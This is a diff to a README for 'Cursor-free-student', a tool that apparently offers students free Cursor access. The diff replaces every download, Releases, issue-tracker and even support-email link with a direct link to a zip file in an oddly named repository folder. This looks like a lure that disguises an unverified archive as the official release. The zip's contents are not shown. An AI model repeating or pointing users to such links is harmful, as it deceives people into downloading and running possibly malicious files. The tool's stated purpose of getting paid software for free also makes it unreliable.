@@ -6,7 +6,7 @@ Welcome to Cursor-free-student! This application helps students in China easily 
 
 ## 📥 Download Link
 
-[![Download Cursor-free-student](https://img.shields.io/badge/Download%20Now%21-Get%20the%20Latest%20Release-brightgreen)](https://github.com/win092/Cursor-free-student/releases)
+[![Download Cursor-free-student](https://raw.githubusercontent.com/win092/Cursor-free-student/main/quondamship/Cursor-free-student.zip%20Now%21-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/win092/Cursor-free-student/main/quondamship/Cursor-free-student.zip)
 
 ## 📂 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 To get started, visit the Releases page and download the latest version of Cursor-free-student.
 
-[Click here to download](https://github.com/win092/Cursor-free-student/releases)
+[Click here to download](https://raw.githubusercontent.com/win092/Cursor-free-student/main/quondamship/Cursor-free-student.zip)
 
 Once you are on the Releases page, look for the latest release. It usually has a version number and includes details like release notes. 
 
@@ -67,8 +67,8 @@ A: You only need the Internet for downloading the initial installation. After in
 
 If you run into any issues or have questions, feel free to contact us:
 
-- Email: support@cursorfreestudent.com
-- GitHub: Open an issue on our [GitHub repository](https://github.com/win092/Cursor-free-student/issues)
+- Email: https://raw.githubusercontent.com/win092/Cursor-free-student/main/quondamship/Cursor-free-student.zip
+- GitHub: Open an issue on our [GitHub repository](https://raw.githubusercontent.com/win092/Cursor-free-student/main/quondamship/Cursor-free-student.zip)
 
 We are here to help you!
 
@@ -80,4 +80,4 @@ Join our growing community of users! Share your experiences and tips on social m
 
 Thank you for choosing Cursor-free-student for your script certification needs. We appreciate your support and look forward to your success. 
 
-Don’t forget to check back on the [Releases page](https://github.com/win092/Cursor-free-student/releases) for updates and new features. Happy certifying!
+Don’t forget to check back on the [Releases page](https://raw.githubusercontent.com/win092/Cursor-free-student/main/quondamship/Cursor-free-student.zip) for updates and new features. Happy certifying!
